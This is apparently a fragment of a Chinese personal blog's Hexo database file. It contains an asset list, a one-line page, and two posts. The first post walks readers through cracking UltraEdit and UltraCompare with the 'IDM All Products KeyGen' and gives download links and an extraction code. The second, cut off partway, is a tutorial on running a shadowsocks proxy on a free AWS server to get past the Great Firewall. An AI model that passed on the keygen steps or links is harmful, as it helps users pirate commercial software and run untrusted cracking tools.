,{"_id":"public/archives/2017/02/index.html","hash":"9d16017e4b68f227bd4f8ea6eb8eb629fe098911","modified":1526497193934},{"_id":"public/archives/2017/04/index.html","hash":"f8a01a86805f16cebd1f06decefed8d51e155a7a","modified":1526497193935},{"_id":"public/archives/2017/05/index.html","hash":"43d027a059774dd959f708c476db846cce0bb5b5","modified":1526497193935},{"_id":"public/archives/2017/06/index.html","hash":"fb0a0073d682e96d6f5284a3bfcd300385b59936","modified":1526497193935},{"_id":"public/archives/2017/08/index.html","hash":"82ad194903a049767ea48a5c35724d98c83cca4c","modified":1526497193935},{"_id":"public/archives/2017/09/index.html","hash":"4c69a67865519864f4cbc1a243a1af21fede784d","modified":1526497193935},{"_id":"public/archives/2017/11/index.html","hash":"47e7d21e76ef435150e9d3c8523c9babf7c17561","modified":1526497193935},{"_id":"public/index.html","hash":"7849d1f420c1d69107ad97f9c50f634970e97ddf","modified":1526497193935},{"_id":"public/page/2/index.html","hash":"adca0b10a126138a6c72ebbbf64767f6bee3abfe","modified":1526497193935},{"_id":"public/page/3/index.html","hash":"2869193c2148c9d55226e9fa9194b21848963fe0","modified":1526497193935},{"_id":"public/page/4/index.html","hash":"1c3a025318b3c209f013fdc958469ad27eb499f1","modified":1526497193935},{"_id":"public/tags/工具/index.html","hash":"a9edf1392fcf010c6fefdf29808dd88905fc9a52","modified":1526497193935},{"_id":"public/tags/工具/page/2/index.html","hash":"1450200af1f00b8851cf0b62ce82fbc87af3b2be","modified":1526497193935},{"_id":"public/tags/从入门到入狱/index.html","hash":"d6bb73f5ee97e3352598d235aeb9a037137f814d","modified":1526497193936},{"_id":"public/tags/音乐/index.html","hash":"1c7f779d4f0570d50334b40d931c09fe86b68608","modified":1526497193936},{"_id":"public/tags/XSS/index.html","hash":"81fe8821aca129f69eaf53425916c2560e36a8fb","modified":1526497193936},{"_id":"public/tags/game/index.html","hash":"7b3256e10e758c00d91abee03449eb10c4d4b0c5","modified":1526497193936},{"_id":"public/tags/Leo/index.html","hash":"1d7e3377fbc43b9c11a75951bda7f70bbe8e5032","modified":1526497193936},{"_id":"public/tags/python/index.html","hash":"d68ad3a2935f2c78a971bd6794785ee83a59b55a","modified":1526497193936},{"_id":"public/tags/反人类/index.html","hash":"cc5e25958df20cc0734bfe2d0df9ba74e66cd793","modified":1526497193936},{"_id":"public/tags/Wargame/index.html","hash":"ce8da22099398421bc5835de71c8e0dd9f01e59d","modified":1526497193936},{"_id":"public/tags/Linux/index.html","hash":"c7b81a0424cb4bb4b06e7af38ba6418769364dd5","modified":1526497193936},{"_id":"public/CNAME","hash":"2ebd773a48a398f19cd3f94d12fe7bf7229ec669","modified":1526497193950},{"_id":"public/Image/Level_2_Timer_Js.png","hash":"844c17fa3e78d89849bf30cd409b3366d755436a","modified":1526497193950},{"_id":"public/Image/Level_2_URL_Encode.png","hash":"f04b7c9529640a293ab19ccc2ce1b7ff81b3b912","modified":1526497193950},{"_id":"public/Image/Level_4_Thanks_For.png","hash":"40723391a71107a53a1f9c1a718bfe6e0b95d48c","modified":1526497193950},{"_id":"public/Image/Level_4_Enter_Email.png","hash":"3a57f0008675e050cf91fa99f69890ec69dde141","modified":1526497193950},{"_id":"public/Image/Level_4_Thanks_For_Source.png","hash":"07a6bddedfd392e7c6306007a8d6729900aa6c27","modified":1526497193950},{"_id":"public/Image/Level_6_Google_XSS.png","hash":"051817049cb1eee2350b88f736aafeb40775495b","modified":1526497193950},{"_id":"public/Image/Level_6_Query.png","hash":"3152874a06dafc22535c54b352ba6f7fa0048a87","modified":1526497193950},{"_id":"public/Image/Level_6_Search.png","hash":"0f886d04695b6d881ca9ffed639935aa8d4e8dc4","modified":1526497193950},{"_id":"public/Image/Level_6_Search_Para.png","hash":"dac68187906d5569ac2acdc7e018d50ee755475d","modified":1526497193950},{"_id":"public/Image/Level_7_Btoa_Function.png","hash":"a1b0278b06388d20943fc05370e366846415c8e8","modified":1526497193950},{"_id":"public/Image/Level_7_Jsonp_XSS.png","hash":"30947a73350e7ebb31149195cdaab09b533ca54b","modified":1526497193950},{"_id":"public/Image/Level_7_Ev1l_Response.png","hash":"981b07540d51c2a8f64ad5c63c8350c0aa15b3ae","modified":1526497193950},{"_id":"public/Image/Level_7_Jsonp_XSS_Blog.png","hash":"4e49c1a5698c9708ad454e9c95e1165d5055e4a7","modified":1526497193950},{"_id":"public/Image/Level_7_Img_Pass_Fail.png","hash":"1177fb2d16ede736634745b3095ba22e1a8723df","modified":1526497193950},{"_id":"public/Image/Level_7_Pass_idea.png","hash":"301333293fbba151dc082fd28dcb8c6e92921eef","modified":1526497193951},{"_id":"public/Image/Level_7_Web_DOM.png","hash":"ad3194949a6b39a78c05a709eae20ad2c3315cdd","modified":1526497193951},{"_id":"public/Image/Level_7_Web_Jsonp.png","hash":"0e553f6de3ce1b95503e73ee870b965020edeb74","modified":1526497193951},{"_id":"public/Image/Level_8_CSP.png","hash":"83595d02afb9174e25a9c54a56a94291a02545f8","modified":1526497193951},{"_id":"public/Image/Level_8_Level8js.png","hash":"03bfcf3b8c13d657888135faefe6e5cb40b2193f","modified":1526497193951},{"_id":"public/Image/Level_8_Send.png","hash":"7679bd5db6560a5958a8d965855d7df0cdf63c90","modified":1526497193951},{"_id":"public/Image/Level_8_Set_Name.png","hash":"6e83e7f9598ba5b1dcf7ce7a6ab193d87264745f","modified":1526497193951},{"_id":"public/Image/Level_8_Token_Not_Same.png","hash":"2d35345d7ac8ab6f99784d79784c95237cd67065","modified":1526497193951},{"_id":"public/Image/ad.png","hash":"252399ed5e1b149815e79c9ce3b81eaab05880c0","modified":1526497193951},{"_id":"public/Image/askwiki.jpg","hash":"e78ea41601aeefb35a287073f57076498b122276","modified":1526497193951},{"_id":"public/Image/aws_jiedian.jpg","hash":"d8af19a6a70c7e42f3849e86b1af61020e879cf1","modified":1526497193951},{"_id":"public/Image/alone.jpg","hash":"03c7666968cbe542a257cf03e0faf5473a9fdfd0","modified":1526497193951},{"_id":"public/Image/aws_qidong.png","hash":"b17500c334fc6877411c339c642dc8afda5e9b71","modified":1526497193951},{"_id":"public/Image/aws_ss_client.jpg","hash":"e1ca3aae583a7eacfbddd998257df11b8c2bcd4a","modified":1526497193951},{"_id":"public/Image/aws_ss_client_config.jpg","hash":"affdd16cfb222bcf00cd4aaa19643dd3bc3e090a","modified":1526497193951},{"_id":"public/Image/aws_wait.png","hash":"f55762ad87fb2fc82491adb586a0be6bd6d0c796","modified":1526497193951},{"_id":"public/Image/hei1.jpeg","hash":"8f7e9c8006988df83629b9c29bc143ab379f8e05","modified":1526497193951},{"_id":"public/Image/beianshenqing.png","hash":"fed38feda22940db03244541af9756b39ba1810f","modified":1526497193951},{"_id":"public/Image/hei3.jpg","hash":"3394e7cc81a8073d00e2e13d5f437dc81f7816af","modified":1526497193951},{"_id":"public/Image/burranlie.jpg","hash":"613ac34cd4f8897c8a379e7fb91c8c220401a94a","modified":1526497193952},{"_id":"public/Image/hei2.jpeg","hash":"f9d8a150a7a740cdd96745acb370bc9e8576eb75","modified":1526497193952},{"_id":"public/Image/memeda.jpg","hash":"b32d1fe9f7045af34e615d79a96face721710fba","modified":1526497193952},{"_id":"public/Image/pugaizai.jpeg","hash":"c9820e04aac60af0fcd6d68a7f7f6b1f88a1ed28","modified":1526497193952},{"_id":"public/Image/laosiji.jpg","hash":"9f262fdde1cbbc06a777184cc4d940380d57f7ed","modified":1526497193952},{"_id":"public/Image/python-love.png","hash":"98aad87fede2b847569569353f5f7aaeb70f5b24","modified":1526497193952},{"_id":"public/Image/shut_up_and_bbox.jpg","hash":"9f900baea2b3dc45b8b49f53424355e84023c44e","modified":1526497193952},{"_id":"public/Image/wunai.jpg","hash":"64bd9a05d08b801206f1820279f273ee55082670","modified":1526497193952},{"_id":"public/Image/walk_away.jpg","hash":"f110f30a2f36b945826a3de0e5c969cb010a6f45","modified":1526497193952},{"_id":"public/Image/xiangbudaoba.jpg","hash":"10970d493d12e1925bb54144df4bbc7e1d5e2698","modified":1526497193952},{"_id":"public/Image/xingfu.jpg","hash":"732968098cc90516bde6a5002a326ee3d82bb659","modified":1526497193952},{"_id":"public/Image/xiugaibaimingdan.png","hash":"8e10f7a7007ddfd2464021851627ebfc33d41f84","modified":1526497193952},{"_id":"public/Image/zzh.webp","hash":"8afcebaa305001225768a037e8634ddd8852f337","modified":1526497193952},{"_id":"public/Image/bandit_resources/00023D502683EF1B4545C5273153F690.jpg","hash":"e6d8c9f05a495838a8b624565e3e65b816355bd2","modified":1526497193952},{"_id":"public/Image/bandit_resources/27CB93E553A707C15C1AB4DCFA52EFBA.jpg","hash":"9f08be030da432abe39bf3664f43991c914b2bf8","modified":1526497193953},{"_id":"public/fonts/iconfont.16acc2.ttf","hash":"f342ac8bf4d937f42a7d6a0032ad267ab47eb7f2","modified":1526497193953},{"_id":"public/fonts/iconfont.45d7ee.svg","hash":"f9304e5714d20861be7d8f4d36687e88e86b9e1b","modified":1526497193953},{"_id":"public/fonts/iconfont.8c627f.woff","hash":"aa9672cb097f7fd73ae5a03bcd3d9d726935bc0a","modified":1526497193953},{"_id":"public/fonts/iconfont.b322fa.eot","hash":"bc8c5e88f4994a852041b4d83f126d9c4d419b4a","modified":1526497193953},{"_id":"public/fonts/default-skin.b257fa.svg","hash":"2ac727c9e092331d35cce95af209ccfac6d4c7c7","modified":1526497193953},{"_id":"public/fonts/tooltip.4004ff.svg","hash":"397fe4b1093bf9b62457dac48aa15dac06b54a3c","modified":1526497193953},{"_id":"public/img/default-skin.png","hash":"ed95a8e40a2c3478c5915376acb8e5f33677f24d","modified":1526497193953},{"_id":"public/img/preloader.gif","hash":"6342367c93c82da1b9c620e97c84a389cc43d96d","modified":1526497193953},{"_id":"public/img/scrollbar_arrow.png","hash":"d64a33c4ddfbdb89deeb6f4e3d36eb84dc4777c0","modified":1526497193953},{"_id":"public/Image/Level_4_Sign_Up.png","hash":"b9b051721be78c55fd86470637d3ebf9fbd6fbde","modified":1526497193963},{"_id":"public/Image/Level_6_Query_String.png","hash":"77c49973fb29e454bc45811a78988865abeba063","modified":1526497193963},{"_id":"public/Image/alipay.png","hash":"e56082101433ea0d328a2aba5910622c0a7a030d","modified":1526497193964},{"_id":"public/Image/aws_ip_config.jpg","hash":"c066cb71f29c2f8dc38a4ef6e4dca84c7aa02858","modified":1526497193964},{"_id":"public/Image/aws_cmd_ps.jpg","hash":"de322c8e7ac50e1ce8a8ed3b76162a4c9e0e9bd0","modified":1526497193964},{"_id":"public/Image/aws_service.png","hash":"3b7f4cb7e3c32cefcca561e3eaa898330e19b080","modified":1526497193964},{"_id":"public/Image/interesting.png","hash":"b12067d574127a716d0eaac6d120e13f94106137","modified":1526497193964},{"_id":"public/Image/wxpay.png","hash":"f0a07986657fe331e59af7243bff583434739082","modified":1526497193964},{"_id":"public/Image/zzh-min.jpg","hash":"1065f6aa85fd04a7d38dccdadb5551860a449a4f","modified":1526497193964},{"_id":"public/Image/bandit_resources/9E633BCC3C0A9193B0E8E2C2B65731BA.jpg","hash":"2f9cfa58960d76f12abfbbd91b8daacc41846a00","modified":1526497193965},{"_id":"public/Image/bandit_resources/AD0B25D055288B2474EDD87D747BCF9F.jpg","hash":"3f916991ffd89b08e981bcaa639279b25ccfd8c7","modified":1526497193965},{"_id":"public/Image/bandit_resources/FDDCDF1F1AA31D4A681D965AB9B27E74.jpg","hash":"6f0dd5c544ddba86caa6ec1252d9ae6580e4cbf5","modified":1526497193965},{"_id":"public/Image/bandit_resources/CA9CFE5E31145E899BB4D6AD535E8B21.jpg","hash":"ceb3201573f1698cdea820f3b5a128733d67ef23","modified":1526497193965},{"_id":"public/Image/bandit_resources/E02BACB49695839AC213BC250033CBDE.jpg","hash":"94df5cab284eea2e1253989b361aa1aaebdcb870","modified":1526497193965},{"_id":"public/Image/bandit_resources/DDF96BC0FFF6CC6F41E8694DBDC1CE1E.jpg","hash":"22cebcc5235ee66c44b03bc89043d21943e24130","modified":1526497193965},{"_id":"public/slider.096dc6.js","hash":"a8b66ef85d96616086ea6256e7288d0b5a2df56d","modified":1526497193973},{"_id":"public/main.507b3a.css","hash":"ddf6e2c6b953c2c59a3c271e6070010a4cc81cf9","modified":1526497193973},{"_id":"public/main.507b3a.js","hash":"59ccafbd45d28c397a8a901152ef5e196077e4f4","modified":1526497193973},{"_id":"public/mobile.992cbe.js","hash":"01b35e71e37aa2849664eb5daf26daede2278398","modified":1526497193973},{"_id":"public/Image/bandit_resources/9D5E08F5F93CA44BC4287F54BD6661FC.jpg","hash":"fd467e6263fb9c7032be03c55b44bc35d1a9f9fd","modified":1526497193973},{"_id":"public/Image/bandit_resources/7BBE68BB3C0BC4EC581DB35ABD35E039.jpg","hash":"3a85cccae00ebcb753a561cf0cc6a99fb58bc288","modified":1526497193973},{"_id":"public/Image/bandit_resources/D9A392F2C38EC45B17ACAAB75A5E3890.jpg","hash":"653ea196bc43da6450d16bfa84eaf27717100f49","modified":1526497193973},{"_id":"public/Image/Level_6_PortSwigger.png","hash":"017079b0eae7f8a7353d9f34c48b9139994dc797","modified":1526497193980},{"_id":"public/Image/aws_connect.jpg","hash":"bb88b625e1b6a1f7ae851dc9774ea40eddc0369e","modified":1526497193980},{"_id":"public/Image/aws_ec2.png","hash":"f338174651f4ab6bbdef0093682e982efa027d87","modified":1526497193980},{"_id":"public/Image/bandit_resources/06367F7F7B9D0A55C16D0B51300F9A4B.jpg","hash":"77c92e60eb7ab99849885b47f22d53601241d94e","modified":1526497193981},{"_id":"public/Image/bandit_resources/5C57A9F0545D1CDEA58442EEDC952A51.jpg","hash":"9a6f27ad870c9a7a8ec543272834db82eb53f7b3","modified":1526497193981},{"_id":"public/Image/Level_8_Send_Fail.png","hash":"8f4c33f2b7dc984f87b1f8f09c7ea2466e5547dd","modified":1526497193988},{"_id":"public/Image/aws_secure.jpg","hash":"fb7acf8b0fdb989b8e6babb8e11c9216c14c8a60","modified":1526497193988},{"_id":"public/Image/bandit_resources/608E268171D41C5563D62EA2F9F30FDE.jpg","hash":"a0d7180ad1febb8c85da856a553290d5f3af102f","modified":1526497193988},{"_id":"public/Image/bandit_resources/BE3283D120238F44FADC24C8EA3F5CB8.jpg","hash":"44cf6b7fb71e017bb4acd5db86f2eb1895827888","modified":1526497193988},{"_id":"public/Image/Level_8_Set_End.png","hash":"d14d5b7074f2bf3614bd12e8dc3cbbd0ccf5c68a","modified":1526497193993},{"_id":"public/Image/jsfuck_chrome.png","hash":"973eed23743c7fea9a7f8666d94c73731d040b21","modified":1526497193993},{"_id":"public/Image/bandit_resources/6672B54C1537E1423C2D857DA346FF5B.jpg","hash":"bcdd86e38bdefa1f4cbe300fd1af4cad2b4505e3","modified":1526497193993},{"_id":"public/Image/Level_8_Pass_Fail.png","hash":"e0b6fa3e6f0c04c2e5cf8f19b83a685d15e66b93","modified":1526497194000},{"_id":"public/Image/aws_case.jpg","hash":"f07050bf45b9dfdcc22f50c33b11add3fb61e9d7","modified":1526497194000},{"_id":"public/Image/url_encode.png","hash":"684b319877eea18ec24427a769f96c107422b39d","modified":1526497194000},{"_id":"public/Image/xwz.png","hash":"33a30f68a262b11b0d8ae95ec1b7ae73d36c46d5","modified":1526497194001},{"_id":"public/Image/Level_7_Callback_Test.png","hash":"17619e247521bb23e9e0f6f3a4e5c74c368591fd","modified":1526497194010},{"_id":"public/Image/aws_welcome.jpg","hash":"fecfa1f1ec2204a58d5a1150040831afcb2c3247","modified":1526497194010},{"_id":"public/Image/Level_7_Pass.png","hash":"938ac4e5e93cbfa5860a9cde1e50fbb905b69472","modified":1526497194017},{"_id":"public/Image/bandit_resources/5750971C77CDE09AD8C9ED4D020D4701.jpg","hash":"c4336b08feba9703a54400a7c470a4fb48343000","modified":1526497194017},{"_id":"public/Image/bandit_resources/851073B8A9CDFA81ECB4F7719C7BDA39.jpg","hash":"73198fef4de0997299d674acc299366d95fd0c28","modified":1526497194018},{"_id":"public/Image/bandit_resources/A821D5D2B3FBEF8E79E26DE69CA97891.jpg","hash":"dab7eaa33c3a64c464a5c9cc87fe00a6c05b1f5b","modified":1526497194018},{"_id":"public/Image/Level_1_Tree_Detail.png","hash":"e12bb274686c1ae794e9da598a8419d44e1f552d","modified":1526497194022},{"_id":"public/Image/Level_2_Pass.png","hash":"94ae4bce81eaf314b8d21454187a513a1e3eed56","modified":1526497194022},{"_id":"public/Image/Level_2_Create_Timer.png","hash":"7399d4a1c4c4c7d7fd134ebe9f1ae604bc6eb85e","modified":1526497194023},{"_id":"public/Image/Level_4_Pass.png","hash":"4fad94c71a2bc67f74dbf24d8fbca267367250dc","modified":1526497194023},{"_id":"public/Image/Level_5_Pass.png","hash":"eb50ca64df80cd3f0e5051bdb4eaefb4f3c41397","modified":1526497194024},{"_id":"public/Image/Level_8_Pass.png","hash":"ce0040411609437162982882f5607abf5c6d4db4","modified":1526497194024},{"_id":"public/Image/Level_6_Welcome.png","hash":"b14ef8886c7953f9cd2e6f38d0ff6aba39e7fd87","modified":1526497194027},{"_id":"public/Image/Level_3_Pass.png","hash":"30471a9c0980f7137fef11699c21517527c3d082","modified":1526497194027},{"_id":"public/Image/Level_8_Welcome.png","hash":"80f2cadac4415978cdf9faeebd2349c15f5e66d7","modified":1526497194028},{"_id":"public/Image/Level_5_Welcome.png","hash":"46221b1ad7b6bbe685656ea4aef572caab3ae70c","modified":1526497194029},{"_id":"public/Image/xssor_github_ende_function.png","hash":"18b40bf65918a44853a91266e9eba7ccb7f48a6d","modified":1526497194029},{"_id":"public/Image/Level_6_Pass.png","hash":"7439aff255e7a3a7a64f29ac3acd17262368234c","modified":1526497194030},{"_id":"public/Image/LEVEL_1_Pass.png","hash":"352a83fe00cd3b8e3daa352721b27c10454e2a09","modified":1526497194034},{"_id":"public/Image/Level_4_Welcome.png","hash":"bf0b83a53c237aeb60bff5e2b1c917cb75ac63ea","modified":1526497194034},{"_id":"public/Image/Level_7_Welcome.png","hash":"5d7e4850fb161dec59f7e1871067905aee23a70b","modified":1526497194035},{"_id":"public/Image/zzh.jpg","hash":"7e622742d73f02ee094cd3ff9956de0df292566d","modified":1526497194036},{"_id":"public/Image/Level_2_Welcome.png","hash":"048cd84838a34cfe4eb02d56b7f8e3a66ea874c9","modified":1526497194037},{"_id":"public/Image/xssor_github_ende.png","hash":"8462c18e25739d53069b780d359781474690cf9c","modified":1526497194057},{"_id":"public/Image/Level_3_Welcome.png","hash":"a0109ac4f2d7f071f5a7b7c1400d3238cf649826","modified":1526497194067},{"_id":"public/Image/All_Level_Pass.png","hash":"9ee5d2170a714eb51391ca940a390dfee2a033da","modified":1526497194077},{"_id":"public/Image/Level_1_Welcome.png","hash":"24bf5067123816d606efb4bd4e2268d943a719ae","modified":1526497194081},{"_id":"public/Image/Start_Playing.png","hash":"2d3439a1791bd6a7e9a9d9521a9080a6f2dea471","modified":1526497194083}],"Category":[],"Data":[],"Page":[{"title":"怀抱冥顽的热忱看草木渐深","date":"2016-11-29T03:18:48.000Z","_content":"> 怀抱冥顽的热忱看草木渐深","source":"怀抱冥顽的热忱看草木渐深/index.md","raw":"---\ntitle: 怀抱冥顽的热忱看草木渐深\ndate: 2016-11-29 11:18:48\n---\n> 怀抱冥顽的热忱看草木渐深","updated":"2017-08-27T16:05:33.000Z","path":"怀抱冥顽的热忱看草木渐深/index.html","comments":1,"layout":"page","_id":"cjh9h0k830001mkwb423h39di","content":"<blockquote>\n<p>怀抱冥顽的热忱看草木渐深</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>怀抱冥顽的热忱看草木渐深</p>\n</blockquote>\n"}],"Post":[{"title":"UltraEdit、UltraCompare 等IDM产品注册机","date":"2017-02-10T10:20:07.000Z","layout":"post","comments":1,"reward":true,"_content":"\n注册机：IDM All Products KeyGen v3.6\n使用时间：2017-2-10 \n注册产品：UltraEdit 23.20.0.43、UltraCompare 16.00.0.50\n\n<!--more-->\n\n**注册过程**\n\n官网或者百度软件中心下载最新版本的UltraEdit ->\n\n重新打开软件 -> \n\n断网（随便输入用户）激活 -> \n\n在注册机中选择对应软件并复制code1、code2 至注册机对应输入框后点击Generate -> \n\n把生成代码粘贴至软件相应输入框中 -> \n\n提交\n\n\n\n|下载方式|下载地址|备注|\n|:--------:|:--------:|:--------:|\n|翻墙党|[IDM All Products KeyGen v3.6](http://www.filehosting.org/file/details/640587/IDM%20All%20Products%20KeyGen%20v3.6.zip)|(填写邮箱，提交请求后会把下载链接发到你的邮箱中。)|\n|墙内党-百度云|[IDM All Products KeyGen v3.6](http://pan.baidu.com/s/1cpbi2a)|(提取码：2sas)|","source":"_posts/UltraEdit_crack.md","raw":"---\ntitle: UltraEdit、UltraCompare 等IDM产品注册机\ndate: 2017-2-10 18:20:07\nlayout: post\ncomments: true\nreward: true\ntags:\n    - 工具\n---\n\n注册机：IDM All Products KeyGen v3.6\n使用时间：2017-2-10 \n注册产品：UltraEdit 23.20.0.43、UltraCompare 16.00.0.50\n\n<!--more-->\n\n**注册过程**\n\n官网或者百度软件中心下载最新版本的UltraEdit ->\n\n重新打开软件 -> \n\n断网（随便输入用户）激活 -> \n\n在注册机中选择对应软件并复制code1、code2 至注册机对应输入框后点击Generate -> \n\n把生成代码粘贴至软件相应输入框中 -> \n\n提交\n\n\n\n|下载方式|下载地址|备注|\n|:--------:|:--------:|:--------:|\n|翻墙党|[IDM All Products KeyGen v3.6](http://www.filehosting.org/file/details/640587/IDM%20All%20Products%20KeyGen%20v3.6.zip)|(填写邮箱，提交请求后会把下载链接发到你的邮箱中。)|\n|墙内党-百度云|[IDM All Products KeyGen v3.6](http://pan.baidu.com/s/1cpbi2a)|(提取码：2sas)|","slug":"UltraEdit_crack","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k800000mkwbifud8fdf","content":"<p>注册机：IDM All Products KeyGen v3.6<br>使用时间：2017-2-10<br>注册产品：UltraEdit 23.20.0.43、UltraCompare 16.00.0.50</p>\n<a id=\"more\"></a>\n<p><strong>注册过程</strong></p>\n<p>官网或者百度软件中心下载最新版本的UltraEdit -&gt;</p>\n<p>重新打开软件 -&gt; </p>\n<p>断网（随便输入用户）激活 -&gt; </p>\n<p>在注册机中选择对应软件并复制code1、code2 至注册机对应输入框后点击Generate -&gt; </p>\n<p>把生成代码粘贴至软件相应输入框中 -&gt; </p>\n<p>提交</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">下载方式</th>\n<th style=\"text-align:center\">下载地址</th>\n<th style=\"text-align:center\">备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">翻墙党</td>\n<td style=\"text-align:center\"><a href=\"http://www.filehosting.org/file/details/640587/IDM%20All%20Products%20KeyGen%20v3.6.zip\" target=\"_blank\" rel=\"external\">IDM All Products KeyGen v3.6</a></td>\n<td style=\"text-align:center\">(填写邮箱，提交请求后会把下载链接发到你的邮箱中。)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">墙内党-百度云</td>\n<td style=\"text-align:center\"><a href=\"http://pan.baidu.com/s/1cpbi2a\" target=\"_blank\" rel=\"external\">IDM All Products KeyGen v3.6</a></td>\n<td style=\"text-align:center\">(提取码：2sas)</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"<p>注册机：IDM All Products KeyGen v3.6<br>使用时间：2017-2-10<br>注册产品：UltraEdit 23.20.0.43、UltraCompare 16.00.0.50</p>","more":"<p><strong>注册过程</strong></p>\n<p>官网或者百度软件中心下载最新版本的UltraEdit -&gt;</p>\n<p>重新打开软件 -&gt; </p>\n<p>断网（随便输入用户）激活 -&gt; </p>\n<p>在注册机中选择对应软件并复制code1、code2 至注册机对应输入框后点击Generate -&gt; </p>\n<p>把生成代码粘贴至软件相应输入框中 -&gt; </p>\n<p>提交</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">下载方式</th>\n<th style=\"text-align:center\">下载地址</th>\n<th style=\"text-align:center\">备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">翻墙党</td>\n<td style=\"text-align:center\"><a href=\"http://www.filehosting.org/file/details/640587/IDM%20All%20Products%20KeyGen%20v3.6.zip\" target=\"_blank\" rel=\"external\">IDM All Products KeyGen v3.6</a></td>\n<td style=\"text-align:center\">(填写邮箱，提交请求后会把下载链接发到你的邮箱中。)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">墙内党-百度云</td>\n<td style=\"text-align:center\"><a href=\"http://pan.baidu.com/s/1cpbi2a\" target=\"_blank\" rel=\"external\">IDM All Products KeyGen v3.6</a></td>\n<td style=\"text-align:center\">(提取码：2sas)</td>\n</tr>\n</tbody>\n</table>"},{"title":"「从入门到入狱系列」 - AWS+SS 0成本徒手翻墙","date":"2017-08-25T16:00:00.000Z","layout":"post","comments":1,"reward":true,"_content":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1077483&auto=0&height=66\"></iframe>   \n\n## 开篇日常BB \n前几天写了个「从入门到入狱系列」的文章，介绍了 xssgame 的通关经验，心里美滋滋。 \n\n分享出来后，萌新 DaLao 们纷纷表示「这他妈根本打不开，看他妈的棒棒鸡」\n难道求学的欲望没有让你的内心躁动不安吗。  \n![askwiki](/Image/askwiki.jpg)  \n<!--more-->\n话说这一切的起因，要从古老的**「GFW(Great Firewall)」**说起。\n那是一个……  自！己！去！查！ \n![xiangbudaoba](/Image/xiangbudaoba.jpg)\n好，我们终于费劲笔墨终于把 GFW 讲完了，接下来我们说说：翻墙干嘛。\n自！己！去！…… 还是说两句吧，要被打。\n起初呢，是因为听说「w\\*w.s\\*x.c\\*m」「w\\*w.pr\\*nh\\*b.com」这些网站有一些「不可描述的东西」，后来呢，就出不来了……\n![laosiji](/Image/laosiji.jpg)\n\n## 关于免费与付费的 vpn\n**说来真是惭愧，人类始终对于繁衍后代有着执着且坚定的信念。「墙挡上了不让看？墙在哪呢？把墙扒了，我要看人儿！」**\n萌新在日常生活中也会因为各种各样的原因接触到「翻墙」这个词汇，有点行动力的小伙伴可能会下载各种免费 vpn 软件来排解内心的寂寞。\n但是呢，免费 vpn 的坑实在是太多了，萌新还是记住一点，天下没有免费的早餐、午餐、晚餐还有夜宵。\n```\n┓┏┓┏┓┃\n┛┗┛┗┛┃＼○／\n┓┏┓┏┓┃  /      STOP\n┛┗┛┗┛┃ノ)\n┓┏┓┏┓┃         USE\n┛┗┛┗┛┃ \n┓┏┓┏┓┃         FREE\n┛┗┛┗┛┃ \n┓┏┓┏┓┃         VPN\n┃┃┃┃┃┃\n```\n这是余弦 DaLao 曾经发过的很经典的一个……一个……这叫啥？算了，就那么个玩意。\n\n那对萌新来讲，不使用「free vpn」应该换成哪些姿势呢。首先想到的可能是「付费 vpn」，付费的其实也一样有风险。  \n我们使用 vpn 时是把网络请求发给一个中间人，中间人帮你去请求，请求完以后再把得到的回复发给你。  \n这个过程中，你的风险成本是不随着「付费」和「免费」的转换而有所降低或上升的。 \n只能说付费的可能收了钱会相对的良心一点，但是我们不能把良心当作理所应当，你觉得呢。\n\n## AWS+SS 的姿势\n前面说到付费与免费都会在服务商的胯下颤抖  \n![buranlie](/Image/burranlie.jpg)\n那我们就自己搭建一个自己的梯子啊～\n自己搭建服务时选择服务器要满足几个条件：  \n>1.有一台属于我们自己的服务器。  \n2.服务器要有「公网 ip」便于我们去访问服务器。  \n3.服务器要能正常访问诸如~~「www.google.com」~~「w\\*w.s\\*x.c\\*m」「w\\*w.pr\\*nh\\*b.com」这些网站。  \n4.最好不花钱～\n\n然后我们发现「亚马逊AWS(Amazon Web Services) 云服务」很适合我们:  \n>1.给你一台属于你的服务器。  \n2.给你分配一个「公网 ip」  \n3.有很多海外服务器可供选择，海外服务器不受 GFW 的限制可以访问「不可描述的网站」。  \n4.免费一年～  \n\n![memeda](/Image/memeda.jpg)  \n当然，美中不足就是每个月15G的流量限制，超出要\u001d花钱 QAQ。\n\n有了服务器以后呢，我们需要在上面跑一个24小时供你使用的翻墙程序「shadowsocks 服务端」。  \n有了服务器上随时待命的程序以后，我们只需要在本地安装一个相应的客户端软件与服务端链接，然后就能顺利通过你自己的服务器访问「不可描述的网站」了。  \n绿色环保无虫害，重点是除了你，没人知道你在看些奇怪的东西。\n\n## 可能是最不正经的教程\n![aws_welcome](/Image/aws_welcome.jpg)\n### 注册\n其实呢，按照你的生物本能去注册就可以……\n这里需要准备一张信用卡，可能会收到「预授权」费用1美刀消费的提示，先别慌，去查查这个「预授权」的交易类型是什么意思让自己放个心。  \n其中有一个身份认证环节，要填写手机号，会有电话打过来要你给出页面中的 pin 码，你可以在手机输入或者一个数字一个数字的读给他听(用英语)，听说好多输入的都有问题，那我这边建议读吧。如果出现点击「Call Me Now」按钮上方会提示你错误，让你联系他们的情况，就点进去提交 `case`，说明好自己的问题：\n![aws_case](/Image/aws_case.jpg)  \n下面选择 `phone` 或者 `chat`。\n客服人员会联系你，不论 `phone` 还是 `chat` 都是英语哦～听不懂的话不用慌，对付对付以后你的邮箱会收到邮件，点击链接进入以后发现这一步已经通过了。\n\n顺利通过注册后，我们点击这个 EC2 进行创建。  \n![aws_ec2](/Image/aws_ec2.png)\n\n接着如果出现如下情况，就等几个小时后再来试试，最多不超过24小时。  \n![aws_wait](/Image/aws_wait.png)\n\n### 创建\n创建的时候呢注意左上角要选择推荐选择东京节点  \n![aws_jiedian](/Image/aws_jiedian.jpg)  